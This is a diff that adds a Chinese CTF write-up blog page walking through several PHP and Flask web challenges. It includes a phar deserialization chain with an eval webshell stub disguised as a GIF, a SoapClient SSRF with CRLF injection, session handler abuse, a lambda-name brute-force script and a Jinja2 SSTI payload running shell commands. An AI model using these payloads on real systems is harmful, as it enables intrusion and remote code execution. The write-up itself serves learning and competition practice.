@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="几道ctf题的wp">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="几个ctf的wp">
+<meta property="og:url" content="http://yoursite.com/2018/12/29/几个ctf的wp/index.html">
+<meta property="og:site_name" content="TGAO&#39;s Blog">
+<meta property="og:description" content="几道ctf题的wp">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-12-29T14:10:55.834Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="几个ctf的wp">
+<meta name="twitter:description" content="几道ctf题的wp">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/12/29/几个ctf的wp/">
+
+
+
+
+
+  <title>几个ctf的wp | TGAO's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">TGAO's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">大柔非柔，至刚无刚</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/29/几个ctf的wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="TGAO">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TGAO's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">几个ctf的wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-29T22:09:30+08:00">
+                2018-12-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>几道ctf题的wp</p>
+<a id="more"></a>
+<p>#0X01</p>
+<hr>
+<p><strong>刚看到这题感觉很像是phar反序列化</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class K0rz3n_secret_flag &#123;</span><br><span class="line">    protected $file_path;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if(preg_match(&apos;/(log|etc|session|proc|read_secret|history|class)/i&apos;, $this-&gt;file_path))&#123;</span><br><span class="line">            die(&quot;Sorry Sorry Sorry&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">include_once($this-&gt;file_path);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这个类在整个页面没有被实例化，猜测是利用反序列化<br>再往下看，还有一处检验gif头标志的，也就是说只能上传gif文件<br>不过可以构造phar可以绕过，而且phar文件的meta_data是序列化后的<br><strong><em>利用phar实行反序列化有需要满足3个条件</em></strong></p>
+<blockquote>
+<ul>
+<li>phar文件要能够上传到服务器端，并且这个上传后保存的地址也要知道</li>
+<li>要有可用的魔术方法作为“跳板”</li>
+<li>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</li>
+</ul>
+</blockquote>
+<p>上传文件可以利用upload函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function upload($path) &#123;</span><br><span class="line">    if(isset($_GET[&apos;url&apos;]))&#123;</span><br><span class="line">         if(preg_match(&apos;/^(http|https).*/i&apos;, $_GET[&apos;url&apos;]))&#123;</span><br><span class="line">            $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;);                                                                                     </span><br><span class="line">            if (substr($data, 0, 6) !== &quot;GIF89a&quot;)&#123;</span><br><span class="line">                die(&quot;Fuck off&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">            file_put_contents($path . &quot;/avatar.gif&quot;, $data);</span><br><span class="line">            die(&quot;Upload OK&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;Hacker&quot;);</span><br><span class="line">        &#125;           </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;Miss the URL~~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>url可控，在本地写个php脚本生成phar文件，改名avatar.gif<br>有许多可以解析phar文件的 PHP文件函数，且PHP识别phar是根据<strong>php __HALT_COMPILER();?&gt;</strong>，所以即使改了后缀后也没事</p>
+<p>##<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">phar实行反序化文章</a><br>层层受阻。。。决定看网上的wp</p>
+<p>##<a href="http://www.k0rz3n.com/2018/11/21/LCTF%202018%20%E9%83%A8%E5%88%86%20web%20%E9%A2%98%20writeup/#0X02-bestphp%E2%80%99s-revenge" target="_blank" rel="noopener">出题人的wp</a></p>
+<p>##<a href="https://lorexxar.cn/2017/11/10/hitcon2017-writeup/#baby-h-master-php-2017" target="_blank" rel="noopener">hctf一道相似题</a><br>这道题还有非预期解<br>思路是通过构造php脚本,生成phar文件，改名后上传到自己的vps上，和我的思路一样哎，有点开心。。。然而我卡在了构造php脚本上<br>wp里的脚本如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class K0rz3n_secret_flag &#123;</span><br><span class="line">    protected $file_path=&apos;/var/www/data/67bf5ff3cfa1cdd00f700328698c2adb/avatar.gif&apos;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if(preg_match(&apos;/(log|etc|session|proc|read_secret|history|class)/i&apos;, $this-&gt;file_path))&#123;</span><br><span class="line">            die(&quot;Sorry Sorry Sorry&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    include_once($this-&gt;file_path);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">$a= new K0rz3n_secret_flag();</span><br><span class="line">$p = new Phar(&apos;./1.phar&apos;, 0);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(&apos;GIF89a&lt;?php echo 1;eval($_GET[&quot;a&quot;]);?&apos;.&apos;&gt;&lt;?php __HALT_COMPILER(); ?&apos;.&apos;&gt;&apos;);</span><br><span class="line">$p-&gt;setMetadata($a);</span><br><span class="line">$p-&gt;addFromString(&apos;1.txt&apos;,&apos;text&apos;);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(&apos;./1.phar&apos;, &apos;avatar.gif&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到把类成员属性赋值了，赋的值为上传后的文件地址，可以通过cookie找到<br>接着又添加了一个木马phar文件了，这个是我没想到的，仔细发现__destruct()<br>魔术函数中的include函数将上传后的文件可以包含，从而getshell。<br>下面就剩一个问题了 用什么文件函数来触发phar实行反序列化<br>在页面找了几个带有可控参数的文件函数，结果都过滤了phar,这是我刚开始卡着的第二点。<br>wp里利用check函数()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function check($path)&#123;</span><br><span class="line">    if(isset($_GET[&apos;c&apos;]))&#123;</span><br><span class="line">        if(preg_match(&apos;/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file)(.|\\s)*/i&apos;,$_GET[&apos;c&apos;]))&#123;</span><br><span class="line">            die(&quot;Hacker Hacker Hacker&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $file_path = $_GET[&apos;c&apos;];</span><br><span class="line">        echo $file_path;</span><br><span class="line">            list($width, $height, $type) = @getimagesize($file_path);</span><br><span class="line">            die(&quot;Width is :&quot; . $width.&quot; px&lt;br&gt;&quot; .</span><br><span class="line">                &quot;Height is :&quot; . $height.&quot; px&lt;br&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        list($width, $height, $type) = @getimagesize($path.&quot;/avatar.gif&quot;);</span><br><span class="line">        die(&quot;Width is :&quot; . $width.&quot; px&lt;br&gt;&quot; .</span><br><span class="line">            &quot;Height is :&quot; . $height.&quot; px&lt;br&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>当初我也试了，因为正则过滤了phar,就放弃了。<br>但这里可以用compress.zlib://phar://绕过正则，达到一样的效果。<br>getimagesize()是获取图片一些属性，返回一个数组，也可以触发phar实行反序列化。</p>
+<p>##<a href="https://images.seebug.org/content/images/2018/08/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s" target="_blank" rel="noopener">受此影响的其它文件函数</a><br>所以整体解题方法</p>
+<blockquote>
+<ol>
+<li>生成一个phar文件(含有某个对象和其属性的序列化信息）</li>
+<li>经过upload上传,其实顺带利用了一个ssrf</li>
+<li>利用check函数中的getimagesize函数触发phar实行反序列化，进而文件包含，getshell.</li>
+</ol>
+</blockquote>
+<p>##总结##</p>
+<ul>
+<li>phar实行反序列化的实质是phar可以以序列化的方式储存对象及其属性，当遇到某个文件函数会触发phar反序列化，从而生成一个对象，然后将精心构造的某个属性值经过一个对象中的魔术方法中的恶意函数进行利用</li>
+<li>compress.zlib://phar://可以代替phar://</li>
+</ul>
+<p>感觉很有意思。</p>
+<h2 id="0X02"><a href="#0X02" class="headerlink" title="#0X02"></a>#0X02</h2><p>题目源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &apos;implode&apos;;</span><br><span class="line">call_user_func($_GET[&apos;f&apos;], $_POST);</span><br><span class="line">session_start();</span><br><span class="line">if (isset($_GET[&apos;name&apos;])) &#123;</span><br><span class="line">    $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION), &apos;welcome_to_the_lctf2018&apos;);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>##首先解决几个函数</p>
+<blockquote>
+<ul>
+<li>mixed call_user_func(callable $callback[, mixed $parameter[, mixed $…]])<br>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数<br>当call_user_func()函数的第一个参数为数组的时候，意为调用某个对象中的方法<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class myclass&#123;	</span><br><span class="line">	function say_hello()&#123;</span><br><span class="line">		echo &quot;hello!\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line">$classname = new myclass();</span><br><span class="line">call_user_func(array($classname,&apos;say_hello&apos;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</blockquote>
+<p>输出hello!</p>
+<blockquote>
+<ul>
+<li>session_start()<br>session_start — 启动新会话或者重用现有会话<br>bool session_start([ array $options = []] )<br>options此参数是一个关联数组，如果提供，那么会用其中的项目覆盖会话配置指示 中的配置项。此数组中的键无需包含 session. 前缀。<br><a href="http://php.net/manual/zh/session.configuration.php" target="_blank" rel="noopener">会话配置指示中的配置项</a><br><a href="https://www.cnblogs.com/gengyi/p/6493962.html" target="_blank" rel="noopener">关于session的几个问题</a></li>
+</ul>
+</blockquote>
+<p>最后一个</p>
+<blockquote>
+<ul>
+<li>reset函数<br>mixed reset( array &amp;$array)<br>reset() 将 array 的内部指针倒回到第一个单元并返回第一个数组单元的值。</li>
+</ul>
+</blockquote>
+<p>##进入题目<br>首先看到call_user_func会想到命令执行漏洞<br>但是那几个执行外壳命令的函数如system，shell_exec,exec等，它们的参数都是string类型，而这里call_user_func的第二个参数是数组类型，所以我继续找其他可以执行命令的函数，结果都是参数都是string类型。<br>扫下目录，发现flag.php文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">only localhost can get flag!</span><br><span class="line">session_start();</span><br><span class="line">echo &apos;only localhost can get flag!&apos;;</span><br><span class="line">$flag = &apos;LCTF&#123;*************************&#125;&apos;;</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)</span><br><span class="line">	&#123; $_SESSION[&apos;flag&apos;] = $flag; &#125; </span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure></p>
+<p>发现flag写进了session里，而且前提条件必须是本地ip<br>而$_SERVER[“REMOTE_ADDR”]是无法伪造的<br>没思路了。<br>接下来搜索wp..<br><a href="http://www.k0rz3n.com/2018/11/21/LCTF%202018%20%E9%83%A8%E5%88%86%20web%20%E9%A2%98%20writeup/#0X02-bestphp%E2%80%99s-revenge" target="_blank" rel="noopener">出题人wp</a><br>首先通过将创建一个soapclient<br>将其序列化，存入session文件里<br>然后从session中取出来<br>这一存一取的过程，session中的数据会先序列化存储，再反序列化取出<br>而这个soapclient实例化对象会发出一个soap请求<br>它需要几个条件</p>
+<ol>
+<li>在不使用 wsdl 的情况下创建的对象(即第一个参数为null)</li>
+<li>调用不存在的方法的时候</li>
+<li>uri这个键必须存在<br>就是利用这个soap请求来构造满足题目要求的ssrf<br>如何构造soap请求学习了一波<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target=&apos;http://127.0.0.1/flag.php&apos;;</span><br><span class="line">$b = new SoapClient(null,array(&apos;location&apos; =&gt; $target,</span><br><span class="line">                               &apos;user_agent&apos; =&gt; &quot;AAA:BBB\r\n&quot;.</span><br><span class="line">                     &quot;Cookie:PHPSESSID=xxxxx&quot;,</span><br><span class="line">                               &apos;uri&apos; =&gt; &quot;hello&quot;));</span><br><span class="line"></span><br><span class="line">$se = serialize($b); </span><br><span class="line">echo urlencode($se);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>利用user_agent在后面加上\r\n，可以构造请求头的多个字段值<br>注意这里的PHPSESSID必须存在，当ssrf访问flag.php时才会将flag写入自己的session中<br>接下来是session反序列化漏洞问题，学习一波<br>在php.ini中存在三项配置项：</p>
+<blockquote>
+<ul>
+<li>session.save_path=””  –设置session的存储路径</li>
+<li>session.save_handler=”” –设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</li>
+<li>session.auto_start  boolen –指定会话模块是否在请求开始时启动一个会话,默认为0不启动</li>
+<li>session.serialize_handler  string –定义用来序列化/反序列化的处理器名字。默认使用php</li>
+</ul>
+</blockquote>
+<p>这一题是利用session.serialize_handler这个配置项</p>
+<blockquote>
+<ul>
+<li>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</li>
+<li>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li>
+<li>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</li>
+</ul>
+</blockquote>
+<p>PHP中的Session的实现是没有问题，危害主要是由于程序员的Session使用不当而引起的。<br>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法<br><a href="https://www.jb51.net/article/116246.htm" target="_blank" rel="noopener">关于具体的session反序列化问题</a></p>
+<p>##漏洞利用</p>
+<p>###首先第一次会话<br><strong><a href="http://xx.xx.xx.xx:port/?name=|序列化data&amp;f=session_start" target="_blank" rel="noopener">http://xx.xx.xx.xx:port/?name=|序列化data&amp;f=session_start</a></strong><br><strong>然后post： serialize_handler=php_serialize</strong><br>为什么会加|这个呢<br>因为session 默认引擎为php</p>
+<p>###接着进行第二次会话<br>这就是利用默认的php session 引擎，因为在存储时,数据格式为键名|反序列化键值，所以在取出数据时，也是同样的方式，认为|符号之前是键名，之后是键值，将键值反序列化取出<br>使得生成soapclient实例化对象，但是此时需要在调用一个对象中不存在的方法<br>源代码上面有一个call_user_func<br>下面还有一个call_user_func<br>所以在利用第一个call_user_func将变量b覆改掉为call_user_func<br><strong>payload <a href="http://xx.xx.xx.xx:port/?f=extract" target="_blank" rel="noopener">http://xx.xx.xx.xx:port/?f=extract</a></strong><br><strong>然后post：b=call_user_func</strong><br>执行到下面的时候即call_user_func(call_user_func,$a);<br>此时数组$a是call_user_func的参数，也就是说此语句会调用oapclient实例化对象中‘“welcome_to_the_lctf2018”方法，此方法不存在，发送soap请求<br>触发ssrf，访问flag.php页面，将flag写入自己的session中</p>
+<p>###最后第三次会话<br>访问页面时，执行到var_dump($_SESSION);时，会将自己的session打印出来,不出意外的话就是两个。。。<br>第一个元素是自己传入的对象<br>第二个元素是ssrf时写入的flag</p>
+<hr>
+<p>#0X05<br>题目源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(32));</span><br><span class="line">eval(&quot;function hhit_$hash()&#123;&quot;</span><br><span class="line">    .&quot;global \$MY;&quot;</span><br><span class="line">    .&quot;\$MY();&quot;</span><br><span class="line">    .&quot;&#125;&quot;);</span><br><span class="line">if(isset($_GET[&apos;func_name&apos;]))&#123;</span><br><span class="line">    $_GET[&quot;func_name&quot;]();</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure></p>
+<p>create_function的匿名函数也是有名字的，名字是\x00lambda_%d，其中%d代表他是当前进程中的第几个匿名函数,直接burp开启跑也可以写脚本跑<br>这个匿名函数在hctf baby^h-master-php-2017  <a href="https://www.jianshu.com/p/19e3ee990cb7" target="_blank" rel="noopener">https://www.jianshu.com/p/19e3ee990cb7</a>  也出现过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://115.159.184.127:10005/?func_name=%00lambda_&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1,1000):</span><br><span class="line">	res=requests.get(url+str(i))</span><br><span class="line">	print(res.url)</span><br><span class="line">	if &quot;&#123;&quot; in res.text:</span><br><span class="line">		print(res.text)</span><br><span class="line">		break</span><br></pre></td></tr></table></figure></p>
+<hr>
+<p>#0X06<br><a href="https://blog.csdn.net/lansatiankongxxc/article/details/78764726" target="_blank" rel="noopener">解题链接</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;eval&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;cd ../&amp;&amp;ls&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现有个flag<br>当然之前找文件找了很多次…<br>然后把popen的参数换成cat /flag<br>整体要经过urlencode传参给name</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/26/一年的总结/" rel="next" title="消逝的时间">
+                <i class="fa fa-chevron-left"></i> 消逝的时间
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="TGAO">
+            
+              <p class="site-author-name" itemprop="name">TGAO</p>
+              <p class="site-description motion-element" itemprop="description">安而后能虑，虑而后能得</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
